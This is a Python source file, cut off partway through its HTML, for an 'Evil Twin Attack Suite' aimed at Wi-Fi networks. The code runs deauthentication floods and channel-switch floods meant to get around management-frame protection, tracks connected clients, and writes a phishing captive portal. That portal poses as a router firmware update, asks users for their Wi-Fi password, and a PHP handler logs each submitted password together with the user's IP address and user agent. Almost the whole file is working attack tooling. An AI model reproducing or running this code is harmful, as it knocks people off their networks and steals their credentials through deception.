#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Evil Twin Attack Suite v2.0
Modern Wi-Fi Penetration Tool
Supports: WPA2/WPA3, WiFi 6 (802.11ax), Channel Hopping, PMF Bypass
"""

import os
import sys
import time
import subprocess
import threading
import signal
from datetime import datetime
import json
import re
import argparse
import random
import struct
import fcntl
import socket
from collections import defaultdict
from typing import Dict, List, Optional, Tuple
import hashlib

# Парсим аргументы командной строки
parser = argparse.ArgumentParser(description='Evil Twin Attack Suite v2.0')
parser.add_argument('--demo', action='store_true', help='Запустить в демо-режиме')
parser.add_argument('--aggressive', action='store_true', help='Агрессивный режим деаутентификации')
parser.add_argument('--stealth', action='store_true', help='Скрытный режим (меньше пакетов)')
parser.add_argument('--wifi6', action='store_true', help='Оптимизация для WiFi 6 целей')
args = parser.parse_args()

DEMO_MODE = args.demo
AGGRESSIVE_MODE = args.aggressive
STEALTH_MODE = args.stealth
WIFI6_MODE = args.wifi6


class Colors:
    """Цветовые схемы для терминала"""
    RESET = '\033[0m'
    RED = '\033[91m'
    WHITE = '\033[97m'
    ORANGE = '\033[38;5;208m'
    BRIGHT_ORANGE = '\033[38;5;214m'
    DARK_ORANGE = '\033[38;5;202m'
    BRIGHT_RED = '\033[1;91m'
    DARK_RED = '\033[31m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    
    CLAUDE_COLORS = [
        '\033[38;5;208m',
        '\033[38;5;214m',
        '\033[38;5;223m',
        '\033[38;5;231m',
    ]
    
    @staticmethod
    def gradient(text, style='claude'):
        colors = Colors.CLAUDE_COLORS if style == 'claude' else [
            '\033[38;5;196m', '\033[38;5;202m', '\033[38;5;208m',
            '\033[38;5;214m', '\033[38;5;220m', '\033[38;5;231m',
        ]
        result = ""
        step = max(len(text) / len(colors), 1)
        for i, char in enumerate(text):
            color_idx = min(int(i / step), len(colors) - 1)
            result += colors[color_idx] + char
        return result + Colors.RESET
    
    @staticmethod
    def animate_gradient(text, frame=0):
        colors = Colors.CLAUDE_COLORS
        result = ""
        for i, char in enumerate(text):
            color_idx = (i + frame) % len(colors)
            result += colors[color_idx] + char
        return result + Colors.RESET


class WiFi6Capabilities:
    """Определение и работа с WiFi 6 (802.11ax) возможностями"""
    
    # HE (High Efficiency) IE Types
    HE_CAPABILITIES_IE = 0xff
    HE_OPERATION_IE = 0xff
    
    # BSS Color информация
    BSS_COLOR_DISABLED = 0
    BSS_COLOR_PARTIAL = 1
    BSS_COLOR_ENABLED = 2
    
    @staticmethod
    def detect_wifi6(beacon_data: bytes) -> dict:
        """Определить поддержку WiFi 6 из beacon frame"""
        wifi6_info = {
            'supported': False,
            'he_capabilities': False,
            'bss_color': None,
            'ofdma': False,
            'mu_mimo': False,
            'twt': False,  # Target Wake Time
            '160mhz': False,
            'spatial_streams': 0
        }
        
        if DEMO_MODE:
            # Рандомные WiFi 6 параметры для демо
            wifi6_info['supported'] = random.choice([True, False])
            if wifi6_info['supported']:
                wifi6_info['he_capabilities'] = True
                wifi6_info['bss_color'] = random.randint(1, 63)
                wifi6_info['ofdma'] = True
                wifi6_info['mu_mimo'] = True
                wifi6_info['spatial_streams'] = random.choice([2, 4, 8])
            return wifi6_info
        
        try:
            # Ищем HE Capabilities в IE
            pos = 0
            while pos < len(beacon_data) - 2:
                ie_type = beacon_data[pos]
                ie_len = beacon_data[pos + 1]
                
                if ie_type == 0xff and ie_len >= 22:  # Extension IE
                    ext_id = beacon_data[pos + 2] if pos + 2 < len(beacon_data) else 0
                    if ext_id == 35:  # HE Capabilities
                        wifi6_info['supported'] = True
                        wifi6_info['he_capabilities'] = True
                        
                        # Парсим HE capabilities
                        if pos + 6 < len(beacon_data):
                            he_mac_cap = beacon_data[pos + 3:pos + 9]
                            wifi6_info['twt'] = bool(he_mac_cap[0] & 0x02)
                        
                        if pos + 12 < len(beacon_data):
                            he_phy_cap = beacon_data[pos + 9:pos + 20]
                            wifi6_info['160mhz'] = bool(he_phy_cap[0] & 0x08)
                            wifi6_info['ofdma'] = True
                            wifi6_info['mu_mimo'] = bool(he_phy_cap[3] & 0x40)
                        
                    elif ext_id == 36:  # HE Operation
                        if pos + 6 < len(beacon_data):
                            wifi6_info['bss_color'] = beacon_data[pos + 4] & 0x3f
                
                pos += 2 + ie_len
                
        except Exception:
            pass
        
        return wifi6_info
    
    @staticmethod
    def get_optimal_attack_params(wifi6_info: dict) -> dict:
        """Получить оптимальные параметры атаки для WiFi 6"""
        params = {
            'deauth_interval': 0.1,
            'deauth_count': 5,
            'use_disassoc': True,
            'target_bss_color': None,
            'channel_width': 20
        }
        
        if wifi6_info.get('supported'):
            # WiFi 6 роутеры более устойчивы к деаутентификации
            params['deauth_interval'] = 0.05  # Быстрее
            params['deauth_count'] = 10  # Больше пакетов
            params['use_disassoc'] = True  # Используем оба типа
            
            if wifi6_info.get('bss_color'):
                params['target_bss_color'] = wifi6_info['bss_color']
            
            if wifi6_info.get('160mhz'):
                params['channel_width'] = 160
            elif wifi6_info.get('ofdma'):
                params['channel_width'] = 80
        
        return params


class ChannelHopper:
    """Отслеживание и синхронизация с channel hopping"""
    
    # Каналы 2.4 GHz
    CHANNELS_24GHZ = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13]
    
    # Каналы 5 GHz (основные)
    CHANNELS_5GHZ = [36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 
                    116, 120, 124, 128, 132, 136, 140, 144, 149, 153, 157, 161, 165]
    
    # Каналы 6 GHz (WiFi 6E)
    CHANNELS_6GHZ = [1, 5, 9, 13, 17, 21, 25, 29, 33, 37, 41, 45, 49, 53,
                    57, 61, 65, 69, 73, 77, 81, 85, 89, 93]
    
    def __init__(self, interface: str, target_bssid: str, initial_channel: int):
        self.interface = interface
        self.target_bssid = target_bssid
        self.current_channel = initial_channel
        self.channel_history: List[Tuple[int, float]] = [(initial_channel, time.time())]
        self.hop_detected = False
        self.monitoring = False
        self.monitor_thread: Optional[threading.Thread] = None
        self.callbacks: List[callable] = []
        self.last_seen = time.time()
        self.hop_count = 0
        self.hop_pattern: List[int] = []
        self.predicted_next_channel: Optional[int] = None
        
        # Определяем диапазон
        if initial_channel in self.CHANNELS_24GHZ:
            self.band = '2.4GHz'
            self.scan_channels = self.CHANNELS_24GHZ
        elif initial_channel in self.CHANNELS_5GHZ:
            self.band = '5GHz'
            self.scan_channels = self.CHANNELS_5GHZ
        else:
            self.band = '6GHz'
            self.scan_channels = self.CHANNELS_6GHZ
    
    def add_callback(self, callback: callable):
        """Добавить callback при смене канала"""
        self.callbacks.append(callback)
    
    def start_monitoring(self):
        """Начать мониторинг смены каналов"""
        self.monitoring = True
        self.monitor_thread = threading.Thread(target=self._monitor_loop, daemon=True)
        self.monitor_thread.start()
    
    def stop_monitoring(self):
        """Остановить мониторинг"""
        self.monitoring = False
        if self.monitor_thread:
            self.monitor_thread.join(timeout=2)
    
    def _monitor_loop(self):
        """Основной цикл мониторинга"""
        scan_idx = 0
        channels_since_found = 0
        
        while self.monitoring:
            if DEMO_MODE:
                # Демо: иногда "меняем" канал
                time.sleep(2)
                if random.random() > 0.8:
                    new_channel = random.choice(self.scan_channels)
                    if new_channel != self.current_channel:
                        self._handle_channel_change(new_channel)
                continue
            
            # Сканируем каналы по очереди
            channel = self.scan_channels[scan_idx]
            
            # Переключаем канал интерфейса
            self._set_channel(channel)
            time.sleep(0.1)
            
            # Проверяем наличие цели на этом канале
            if self._check_target_on_channel(channel):
                channels_since_found = 0
                
                if channel != self.current_channel:
                    self._handle_channel_change(channel)
                else:
                    self.last_seen = time.time()
            else:
                channels_since_found += 1
            
            # Если давно не видели цель, сканируем быстрее
            if channels_since_found > len(self.scan_channels):
                time.sleep(0.05)
            else:
                time.sleep(0.2)
            
            scan_idx = (scan_idx + 1) % len(self.scan_channels)
    
    def _set_channel(self, channel: int):
        """Переключить канал интерфейса"""
        try:
            subprocess.run(
                ['iwconfig', self.interface, 'channel', str(channel)],
                capture_output=True,
                timeout=1
            )
        except Exception:
            pass
    
    def _check_target_on_channel(self, channel: int) -> bool:
        """Проверить находится ли цель на канале"""
        try:
            # Быстрое сканирование с помощью iw
            result = subprocess.run(
                ['iw', 'dev', self.interface, 'scan', 'freq', 
                 str(self._channel_to_freq(channel)), 'flush'],
                capture_output=True,
                text=True,
                timeout=2
            )
            
            return self.target_bssid.lower() in result.stdout.lower()
        except Exception:
            return False
    
    def _channel_to_freq(self, channel: int) -> int:
        """Конвертировать канал в частоту"""
        if channel <= 13:
            return 2407 + channel * 5
        elif channel == 14:
            return 2484
        elif channel >= 36 and channel <= 165:
            return 5000 + channel * 5
        else:
            # 6 GHz
            return 5950 + channel * 5
    
    def _handle_channel_change(self, new_channel: int):
        """Обработать смену канала"""
        old_channel = self.current_channel
        self.current_channel = new_channel
        self.channel_history.append((new_channel, time.time()))
        self.hop_count += 1
        self.hop_detected = True
        self.last_seen = time.time()
        
        # Обновляем паттерн прыжков
        self.hop_pattern.append(new_channel)
        if len(self.hop_pattern) > 10:
            self.hop_pattern.pop(0)
        
        # Пытаемся предсказать следующий канал
        self._predict_next_channel()
        
        # Вызываем callbacks
        for callback in self.callbacks:
            try:
                callback(old_channel, new_channel)
            except Exception:
                pass
    
    def _predict_next_channel(self):
        """Предсказать следующий канал"""
        if len(self.hop_pattern) < 3:
            self.predicted_next_channel = None
            return
        
        # Ищем паттерн
        pattern_len = 2
        while pattern_len <= len(self.hop_pattern) // 2:
            pattern = self.hop_pattern[-pattern_len:]
            # Ищем этот паттерн раньше в истории
            for i in range(len(self.hop_pattern) - pattern_len):
                if self.hop_pattern[i:i+pattern_len] == pattern:
                    # Нашли паттерн, предсказываем следующий
                    next_idx = i + pattern_len
                    if next_idx < len(self.hop_pattern):
                        self.predicted_next_channel = self.hop_pattern[next_idx]
                        return
            pattern_len += 1
        
        self.predicted_next_channel = None
    
    def get_channel_stats(self) -> dict:
        """Получить статистику по каналам"""
        channel_counts = defaultdict(int)
        for channel, _ in self.channel_history:
            channel_counts[channel] += 1
        
        return {
            'current': self.current_channel,
            'band': self.band,
            'hop_count': self.hop_count,
            'history_size': len(self.channel_history),
            'most_used': max(channel_counts.items(), key=lambda x: x[1])[0] if channel_counts else None,
            'predicted_next': self.predicted_next_channel,
            'last_seen_ago': time.time() - self.last_seen
        }


class PMFBypass:
    """Обход Protected Management Frames (802.11w)"""
    
    # Capability flags
    MFPC = 0x80  # Management Frame Protection Capable
    MFPR = 0x40  # Management Frame Protection Required
    
    def __init__(self):
        self.pmf_status = 'unknown'
        self.bypass_method = None
    
    @staticmethod
    def detect_pmf(beacon_data: bytes) -> dict:
        """Определить статус PMF из beacon frame"""
        pmf_info = {
            'enabled': False,
            'required': False,
            'capable': False,
            'cipher_suite': None
        }
        
        if DEMO_MODE:
            pmf_info['enabled'] = random.choice([True, False])
            pmf_info['required'] = pmf_info['enabled'] and random.choice([True, False])
            pmf_info['capable'] = True
            return pmf_info
        
        try:
            # Ищем RSN IE (Element ID 48)
            pos = 0
            while pos < len(beacon_data) - 2:
                ie_type = beacon_data[pos]
                ie_len = beacon_data[pos + 1]
                
                if ie_type == 48 and ie_len >= 8:  # RSN IE
                    rsn_data = beacon_data[pos + 2:pos + 2 + ie_len]
                    
                    # Парсим RSN Capabilities (последние 2 байта перед PMKID)
                    if len(rsn_data) >= 8:
                        # Находим RSN Capabilities
                        # Структура: Version(2) + Group Cipher(4) + Pairwise Count(2) + 
                        #           Pairwise Suites(4*n) + AKM Count(2) + AKM Suites(4*n) + 
                        #           RSN Capabilities(2)
                        
                        cap_offset = 2 + 4  # Skip version and group cipher
                        pairwise_count = struct.unpack('<H', rsn_data[cap_offset:cap_offset+2])[0]
                        cap_offset += 2 + pairwise_count * 4
                        
                        akm_count = struct.unpack('<H', rsn_data[cap_offset:cap_offset+2])[0]
                        cap_offset += 2 + akm_count * 4
                        
                        if cap_offset + 2 <= len(rsn_data):
                            rsn_cap = struct.unpack('<H', rsn_data[cap_offset:cap_offset+2])[0]
                            
                            pmf_info['capable'] = bool(rsn_cap & PMFBypass.MFPC)
                            pmf_info['required'] = bool(rsn_cap & PMFBypass.MFPR)
                            pmf_info['enabled'] = pmf_info['capable']
                    
                    break
                
                pos += 2 + ie_len
                
        except Exception:
            pass
        
        return pmf_info
    
    @staticmethod
    def get_bypass_strategy(pmf_info: dict) -> dict:
        """Определить стратегию обхода PMF"""
        strategy = {
            'method': 'standard_deauth',
            'success_probability': 'high',
            'notes': []
        }
        
        if not pmf_info.get('enabled'):
            return strategy
        
        if pmf_info.get('required'):
            # PMF обязателен - стандартная деаутентификация не работает
            strategy['method'] = 'channel_switch_attack'
            strategy['success_probability'] = 'medium'
            strategy['notes'].append('PMF required - using CSA attack')
            strategy['notes'].append('Target must support CSA')
        else:
            # PMF опционален - некоторые клиенты уязвимы
            strategy['method'] = 'mixed_attack'
            strategy['success_probability'] = 'medium-high'
            strategy['notes'].append('PMF optional - some clients vulnerable')
            strategy['notes'].append('Using both deauth and CSA')
        
        return strategy
    
    @staticmethod
    def craft_csa_frame(bssid: str, current_channel: int, new_channel: int) -> bytes:
        """Создать Channel Switch Announcement frame"""
        # CSA Element
        # Element ID: 37
        # Length: 3
        # Channel Switch Mode: 1 (stop transmitting)
        # New Channel: target channel
        # Channel Switch Count: 1 (immediate)
        
        csa_element = bytes([
            37,  # Element ID
            3,   # Length
            1,   # Channel Switch Mode
            new_channel,  # New Channel Number
            1    # Channel Switch Count
        ])
        
        return csa_element


class SmartDeauth:
    """Умная адаптивная деаутентификация"""
    
    # Reason codes
    REASON_UNSPECIFIED = 1
    REASON_PREV_AUTH_NOT_VALID = 2
    REASON_DEAUTH_LEAVING = 3
    REASON_DISASSOC_INACTIVITY = 4
    REASON_DISASSOC_AP_BUSY = 5
    REASON_CLASS2_FRAME_FROM_NONAUTH = 6
    REASON_CLASS3_FRAME_FROM_NONASSOC = 7
    REASON_DISASSOC_STA_LEAVING = 8
    REASON_MIC_FAILURE = 14
    REASON_4WAY_HANDSHAKE_TIMEOUT = 15
    
    def __init__(self, interface: str, target_bssid: str, 
                 channel_hopper: ChannelHopper,
                 wifi6_info: dict = None,
                 pmf_info: dict = None):
        self.interface = interface
        self.target_bssid = target_bssid
        self.channel_hopper = channel_hopper
        self.wifi6_info = wifi6_info or {}
        self.pmf_info = pmf_info or {}
        
        self.running = False
        self.thread: Optional[threading.Thread] = None
        self.clients: Dict[str, dict] = {}
        self.deauth_stats = {
            'sent': 0,
            'successful': 0,
            'clients_disconnected': 0
        }
        
        # Адаптивные параметры
        self.base_interval = 0.1
        self.current_interval = 0.1
        self.burst_count = 5
        self.reason_rotation = True
        self.use_disassoc = True
        
        # Применяем оптимизации для WiFi 6
        if wifi6_info.get('supported'):
            params = WiFi6Capabilities.get_optimal_attack_params(wifi6_info)
            self.base_interval = params['deauth_interval']
            self.burst_count = params['deauth_count']
        
        # Стратегия для PMF
        self.bypass_strategy = PMFBypass.get_bypass_strategy(pmf_info)
    
    def start(self):
        """Запустить деаутентификацию"""
        self.running = True
        self.thread = threading.Thread(target=self._deauth_loop, daemon=True)
        self.thread.start()
    
    def stop(self):
        """Остановить деаутентификацию"""
        self.running = False
        if self.thread:
            self.thread.join(timeout=2)
    
    def add_client(self, client_mac: str, info: dict = None):
        """Добавить клиента для целевой деаутентификации"""
        self.clients[client_mac.upper()] = info or {
            'first_seen': time.time(),
            'deauth_count': 0,
            'last_deauth': None
        }
    
    def _deauth_loop(self):
        """Основной цикл деаутентификации"""
        reason_codes = [
            self.REASON_DEAUTH_LEAVING,
            self.REASON_UNSPECIFIED,
            self.REASON_CLASS2_FRAME_FROM_NONAUTH,
            self.REASON_DISASSOC_INACTIVITY,
        ]
        reason_idx = 0
        
        # Подписываемся на смену канала
        self.channel_hopper.add_callback(self._on_channel_change)
        
        while self.running:
            try:
                current_channel = self.channel_hopper.current_channel
                
                # Выбираем reason code
                if self.reason_rotation:
                    reason = reason_codes[reason_idx]
                    reason_idx = (reason_idx + 1) % len(reason_codes)
                else:
                    reason = self.REASON_DEAUTH_LEAVING
                
                # Определяем метод атаки
                if self.bypass_strategy['method'] == 'channel_switch_attack':
                    self._send_csa_attack(current_channel)
                elif self.bypass_strategy['method'] == 'mixed_attack':
                    # Чередуем CSA и deauth
                    if random.random() > 0.5:
                        self._send_csa_attack(current_channel)
                    else:
                        self._send_deauth_burst(reason)
                else:
                    self._send_deauth_burst(reason)
                
                # Адаптивный интервал
                if self.channel_hopper.hop_detected:
                    # Роутер прыгает - увеличиваем интенсивность
                    self.current_interval = self.base_interval * 0.5
                    self.channel_hopper.hop_detected = False
                else:
                    # Постепенно возвращаемся к базовому интервалу
                    self.current_interval = min(
                        self.current_interval * 1.1,
                        self.base_interval * 2
                    )
                
                time.sleep(self.current_interval)
                
            except Exception as e:
                time.sleep(0.5)
    
    def _send_deauth_burst(self, reason: int):
        """Отправить серию deauth пакетов"""
        if DEMO_MODE:
            self.deauth_stats['sent'] += self.burst_count
            return
        
        # Broadcast deauth
        for _ in range(self.burst_count):
            try:
                subprocess.run(
                    ['aireplay-ng', '--deauth', '1',
                     '-a', self.target_bssid,
                     self.interface],
                    capture_output=True,
                    timeout=1
                )
                self.deauth_stats['sent'] += 1
            except Exception:
                pass
        
        # Disassoc если включено
        if self.use_disassoc:
            for _ in range(self.burst_count // 2):
                try:
                    # aireplay-ng не поддерживает disassoc напрямую,
                    # используем mdk4 если доступен
                    subprocess.run(
                        ['mdk4', self.interface, 'd',
                         '-B', self.target_bssid,
                         '-c', str(self.channel_hopper.current_channel)],
                        capture_output=True,
                        timeout=1
                    )
                except Exception:
                    pass
        
        # Целевые deauth для известных клиентов
        for client_mac in list(self.clients.keys()):
            for _ in range(self.burst_count // 2):
                try:
                    subprocess.run(
                        ['aireplay-ng', '--deauth', '1',
                         '-a', self.target_bssid,
                         '-c', client_mac,
                         self.interface],
                        capture_output=True,
                        timeout=1
                    )
                    self.deauth_stats['sent'] += 1
                    self.clients[client_mac]['deauth_count'] += 1
                    self.clients[client_mac]['last_deauth'] = time.time()
                except Exception:
                    pass
    
    def _send_csa_attack(self, current_channel: int):
        """Отправить Channel Switch Announcement атаку"""
        if DEMO_MODE:
            self.deauth_stats['sent'] += 1
            return
        
        # Выбираем фейковый новый канал
        if current_channel in ChannelHopper.CHANNELS_24GHZ:
            new_channel = random.choice([c for c in ChannelHopper.CHANNELS_24GHZ if c != current_channel])
        else:
            new_channel = random.choice([c for c in ChannelHopper.CHANNELS_5GHZ if c != current_channel])
        
        try:
            # Используем mdk4 для CSA атаки
            subprocess.run(
                ['mdk4', self.interface, 'd',
                 '-B', self.target_bssid,
                 '-c', str(current_channel),
                 '-E', str(new_channel)],  # CSA to new channel
                capture_output=True,
                timeout=1
            )
            self.deauth_stats['sent'] += 1
        except Exception:
            pass
    
    def _on_channel_change(self, old_channel: int, new_channel: int):
        """Обработчик смены канала"""
        # Помечаем что произошёл hop
        self.channel_hopper.hop_detected = True
        
        # Переключаем интерфейс на новый канал
        try:
            subprocess.run(
                ['iwconfig', self.interface, 'channel', str(new_channel)],
                capture_output=True,
                timeout=1
            )
        except Exception:
            pass


class ClientTracker:
    """Отслеживание клиентов целевой сети"""
    
    def __init__(self, interface: str, target_bssid: str, channel_hopper: ChannelHopper):
        self.interface = interface
        self.target_bssid = target_bssid
        self.channel_hopper = channel_hopper
        
        self.clients: Dict[str, dict] = {}
        self.running = False
        self.thread: Optional[threading.Thread] = None
        self.callbacks: List[callable] = []
    
    def add_callback(self, callback: callable):
        """Добавить callback при обнаружении клиента"""
        self.callbacks.append(callback)
    
    def start(self):
        """Начать отслеживание клиентов"""
        self.running = True
        self.thread = threading.Thread(target=self._track_loop, daemon=True)
        self.thread.start()
    
    def stop(self):
        """Остановить отслеживание"""
        self.running = False
        if self.thread:
            self.thread.join(timeout=2)
    
    def _track_loop(self):
        """Основной цикл отслеживания"""
        temp_file = f"/tmp/clients_{int(time.time())}"
        
        while self.running:
            if DEMO_MODE:
                # Генерируем фейковых клиентов
                time.sleep(3)
                if random.random() > 0.6:
                    fake_mac = ':'.join([f'{random.randint(0, 255):02X}' for _ in range(6)])
                    self._handle_new_client(fake_mac, {
                        'signal': random.randint(-80, -30),
                        'packets': random.randint(10, 1000)
                    })
                continue
            
            try:
                # Запускаем короткое сканирование
                proc = subprocess.Popen(
                    ['airodump-ng',
                     '-c', str(self.channel_hopper.current_channel),
                     '--bssid', self.target_bssid,
                     '-w', temp_file,
                     '--write-interval', '2',
                     '--output-format', 'csv',
                     self.interface],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                
                time.sleep(3)
                proc.terminate()
                proc.wait(timeout=2)
                
                # Парсим результаты
                csv_file = f"{temp_file}-01.csv"
                if os.path.exists(csv_file):
                    self._parse_clients(csv_file)
                    os.remove(csv_file)
                
            except Exception:
                time.sleep(1)
    
    def _parse_clients(self, csv_file: str):
        """Парсинг клиентов из CSV"""
        try:
            with open(csv_file, 'r', errors='ignore') as f:
                lines = f.readlines()
            
            in_client_section = False
            for line in lines:
                if 'Station MAC' in line:
                    in_client_section = True
                    continue
                
                if in_client_section and line.strip():
                    parts = line.split(',')
                    if len(parts) >= 6:
                        client_mac = parts[0].strip().upper()
                        bssid = parts[5].strip().upper() if len(parts) > 5 else ''
                        
                        if ':' in client_mac and bssid == self.target_bssid.upper():
                            if client_mac not in self.clients:
                                signal = int(parts[3].strip()) if parts[3].strip().lstrip('-').isdigit() else -80
                                self._handle_new_client(client_mac, {
                                    'signal': signal,
                                    'packets': int(parts[4].strip()) if parts[4].strip().isdigit() else 0
                                })
                            else:
                                # Обновляем существующего
                                self.clients[client_mac]['last_seen'] = time.time()
                                self.clients[client_mac]['packets'] = int(parts[4].strip()) if parts[4].strip().isdigit() else 0
                                
        except Exception:
            pass
    
    def _handle_new_client(self, mac: str, info: dict):
        """Обработка нового клиента"""
        self.clients[mac] = {
            'mac': mac,
            'first_seen': time.time(),
            'last_seen': time.time(),
            **info
        }
        
        for callback in self.callbacks:
            try:
                callback(mac, self.clients[mac])
            except Exception:
                pass


class ModernEvilTwin:
    """Современная Evil Twin атака с поддержкой WiFi 6, PMF, Channel Hopping"""
    
    def __init__(self, ap_interface: str, deauth_interface: str, target: dict):
        self.ap_interface = ap_interface
        self.deauth_interface = deauth_interface
        self.target = target
        
        # Инициализация компонентов
        self.channel_hopper = ChannelHopper(
            deauth_interface,
            target['bssid'],
            int(target['channel'])
        )
        
        self.wifi6_info = WiFi6Capabilities.detect_wifi6(b'')  # TODO: передавать реальный beacon
        self.pmf_info = PMFBypass.detect_pmf(b'')  # TODO: передавать реальный beacon
        
        self.smart_deauth = SmartDeauth(
            deauth_interface,
            target['bssid'],
            self.channel_hopper,
            self.wifi6_info,
            self.pmf_info
        )
        
        self.client_tracker = ClientTracker(
            deauth_interface,
            target['bssid'],
            self.channel_hopper
        )
        
        # Логи и состояние
        self.deauth_log: List[str] = []
        self.ap_log: List[str] = []
        self.captured_passwords: List[str] = []
        
        self.running = False
        self.attack_successful = False
        self.correct_password: Optional[str] = None
        
        # Статистика
        self.stats = {
            'channel_hops': 0,
            'clients_seen': 0,
            'deauth_sent': 0,
            'passwords_captured': 0
        }
    
    def log_deauth(self, message: str):
        """Добавить запись в deauth лог"""
        timestamp = datetime.now().strftime('%H:%M:%S')
        entry = f"[{timestamp}] {message}"
        self.deauth_log.append(entry)
        if len(self.deauth_log) > 100:
            self.deauth_log.pop(0)
    
    def log_ap(self, message: str):
        """Добавить запись в AP лог"""
        timestamp = datetime.now().strftime('%H:%M:%S')
        entry = f"[{timestamp}] {message}"
        self.ap_log.append(entry)
        if len(self.ap_log) > 100:
            self.ap_log.pop(0)
    
    def setup(self):
        """Подготовка атаки"""
        self.log_ap("Initializing Modern Evil Twin...")
        
        # Логируем информацию о цели
        self.log_ap(f"Target: {self.target['ssid']}")
        self.log_ap(f"BSSID: {self.target['bssid']}")
        self.log_ap(f"Channel: {self.target['channel']}")
        self.log_ap(f"Band: {self.channel_hopper.band}")
        
        # WiFi 6 информация
        if self.wifi6_info.get('supported'):
            self.log_ap("[!] WiFi 6 (802.11ax) detected")
            if self.wifi6_info.get('bss_color'):
                self.log_ap(f"BSS Color: {self.wifi6_info['bss_color']}")
        
        # PMF информация
        if self.pmf_info.get('required'):
            self.log_ap("[!] PMF Required - using advanced bypass")
        elif self.pmf_info.get('enabled'):
            self.log_ap("[!] PMF Enabled - mixed attack mode")
        
        # Создаем фишинговый портал
        self._create_portal()
        
        # Настраиваем AP
        self._setup_ap()
        
        # Запускаем сервисы
        self._start_services()
    
    def _create_portal(self):
        """Создание фишингового портала"""
        self.log_ap("Creating captive portal...")
        
        # Адаптивный портал под цель
        portal_html = self._generate_adaptive_portal()
        
        if not DEMO_MODE:
            os.makedirs('/tmp/portal', exist_ok=True)
            with open('/tmp/portal/index.html', 'w') as f:
                f.write(portal_html)
            
            # PHP обработчик
            php_handler = """<?php
$password = $_POST['password'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'];
$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
$time = date('Y-m-d H:i:s');

$log_file = '/tmp/evil_twin_passwords.txt';
$log_entry = json_encode([
    'time' => $time,
    'ip' => $ip,
    'password' => $password,
    'user_agent' => $ua
]) . "\\n";

file_put_contents($log_file, $log_entry, FILE_APPEND);
header('Location: https://www.google.com');
exit();
?>"""
            
            with open('/tmp/portal/verify.php', 'w') as f:
                f.write(php_handler)
    
    def _generate_adaptive_portal(self) -> str:
        """Генерация адаптивного портала"""
        # Определяем производителя по OUI
        oui = self.target['bssid'][:8].upper().replace(':', '')
        
        vendor_themes = {
            '000C43': ('Ralink', '#FF6B35', '#1A1A2E'),
            '001A2B': ('Ayecom', '#00A8E8', '#003459'),
            'FCECDA': ('Ubiquiti', '#0559C9', '#FFFFFF'),
            '00189B': ('Thomson', '#E31837', '#FFFFFF'),
            '001E58': ('D-Link', '#FF6600', '#003366'),
            'F8D111': ('TP-Link', '#4ACBD6', '#1A5276'),
            '0024B2': ('Netgear', '#6A0572', '#FFFFFF'),
            '00265A': ('Zyxel', '#00529B', '#FFFFFF'),
            '001DD8': ('Microsoft', '#00A4EF', '#FFFFFF'),
            '00224D': ('Cisco', '#049FD9', '#FFFFFF'),
        }
        
        # Дефолтная тема
        vendor_name = 'Router'
        primary_color = '#667eea'
        secondary_color = '#764ba2'
        
        for prefix, (name, primary, secondary) in vendor_themes.items():
            if oui.startswith(prefix):
                vendor_name = name
                primary_color = primary
                secondary_color = secondary
                break
        
        return f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{self.target['ssid']} - Security Update</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, {primary_color} 0%, {secondary_color} 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }}
        .container {{
            background: white;
            border-radius: 20px;
            padding: 40px;
            max-width: 420px;
            width: 100%;
            box-shadow: 0 25px 80px rgba(0,0,0,0.35);
        }}
        .logo {{
            text-align: center;
            margin-bottom: 25px;
            font-size: 48px;
        }}
        h1 {{
            color: #333;
            font-size: 22px;
            margin-bottom: 8px;
            text-align: center;
        }}
        .subtitle {{
            color: #666;
            font-size: 14px;
            text-align: center;
            margin-bottom: 25px;
        }}
        .ssid-badge {{
            background: linear-gradient(135deg, {primary_color}, {secondary_color});
            color: white;
            padding: 8px 16px;
            border-radius: 20px;
            display: inline-block;
            font-size: 13px;
            margin-bottom: 20px;
        }}
        .warning {{
            background: #fff3cd;
            border-left: 4px solid #ffc107;
            padding: 15px;
            margin-bottom: 25px;
            border-radius: 8px;
            font-size: 14px;
            color: #856404;
        }}
        .input-group {{
            margin-bottom: 20px;
        }}
        label {{
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-weight: 500;
            font-size: 14px;
        }}
        input[type="password"] {{
            width: 100%;
            padding: 14px 16px;
            border: 2px solid #e0e0e0;
            border-radius: 10px;
            font-size: 16px;
            transition: all 0.3s;
        }}
        input[type="password"]:focus {{
            outline: none;
            border-color: {primary_color};
            box-shadow: 0 0 0 3px {primary_color}22;
        }}
        button {{
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, {primary_color}, {secondary_color});
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
        }}
        button:hover {{
            transform: translateY(-2px);
            box-shadow: 0 10px 30px {primary_color}66;
        }}
        .progress {{
            height: 4px;
            background: #f0f0f0;
            border-radius: 2px;
            margin-top: 15px;
            overflow: hidden;
            display: none;
        }}
        .progress-bar {{
            height: 100%;
            background: linear-gradient(90deg, {primary_color}, {secondary_color});
            width: 0%;
            transition: width 0.3s;
        }}
        .footer {{
            margin-top: 25px;
            text-align: center;
            font-size: 12px;
            color: #999;
        }}
        .secure-badge {{
            color: #4caf50;
            font-weight: 500;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">🔐</div>
        <h1>Security Verification Required</h1>
        <p class="subtitle">
            <span class="ssid-badge">📶 {self.target['ssid']}</span>
        </p>
        
        <div class="warning">
            <strong>⚠️ Firmware Update</strong><br>
            A critical security update requires re-authentication.
            Please enter your Wi-Fi password to continue.
        </div>
        
        <form action="verify.php" method="POST" onsubmit="showProgress()">
            <div class="input-group">
                <label for="password">Wi-Fi Password:</label>
